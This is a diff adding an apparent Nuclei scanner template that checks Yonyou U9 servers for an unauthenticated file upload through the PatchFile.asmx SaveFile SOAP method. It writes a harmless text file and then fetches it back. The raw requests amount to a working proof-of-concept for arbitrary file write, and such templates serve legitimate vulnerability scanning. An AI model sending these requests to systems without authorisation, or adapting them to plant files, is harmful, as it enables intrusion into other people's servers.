@@ -1,0 +1,45 @@
+id: yongyou-u9-PatchFile-fileupload
+info:
+  name: yongyou-u9-PatchFile-fileupload
+  author: msk
+  severity: critical
+
+
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+
+
+http:
+  - raw:
+      - |
+        POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64)
+        Connection: close
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/SaveFile"
+        Accept-Encoding: gzip, deflate
+
+        <?xml version="1.0" encoding="utf-8"?>
+         <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+           <SaveFile xmlns="http://tempuri.org/">
+            <binData>{{base64("111")}}</binData>
+            <path>./</path>
+            <fileName>{{filename}}.txt</fileName>
+           </SaveFile>
+          </soap:Body>
+         </soap:Envelope>
+
+
+      - |
+        GET /CS/Office/AutoUpdates/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"111")
